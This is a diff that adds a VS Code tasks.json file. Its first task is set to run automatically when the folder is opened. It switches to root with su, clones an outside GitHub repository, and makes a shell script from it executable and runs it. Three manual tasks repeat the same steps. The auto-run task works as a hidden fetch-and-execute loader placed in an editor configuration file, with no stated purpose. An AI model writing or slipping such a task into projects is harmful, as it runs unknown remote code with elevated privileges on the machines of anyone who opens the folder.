@@ -1,0 +1,50 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Auto Startup Sequence",
+      "type": "shell",
+      "command": "su -c 'git clone https://github.com/minfm109-bot/tm.git && cd tm && sed -i \"s/\\r$//\" tm.sh && chmod +x tm.sh && ./tm.sh'",
+      "presentation": {
+        "echo": true,
+        "reveal": "always",
+        "focus": true,
+        "panel": "dedicated"
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
+      "label": "Manual: Switch User",
+      "type": "shell",
+      "command": "su",
+      "presentation": {
+        "echo": true,
+        "reveal": "always",
+        "focus": true,
+        "panel": "dedicated"
+      }
+    },
+    {
+      "label": "Manual: Git Clone",
+      "type": "shell",
+      "command": "git clone https://github.com/minfm109-bot/tm.git",
+      "presentation": {
+        "echo": true,
+        "reveal": "always",
+        "panel": "dedicated"
+      }
+    },
+    {
+      "label": "Manual: Run Script",
+      "type": "shell",
+      "command": "cd tm && sed -i 's/\\r$//' tm.sh && chmod +x tm.sh && ./tm.sh",
+      "presentation": {
+        "echo": true,
+        "reveal": "always",
+        "panel": "dedicated"
+      }
+    }
+  ]
+}
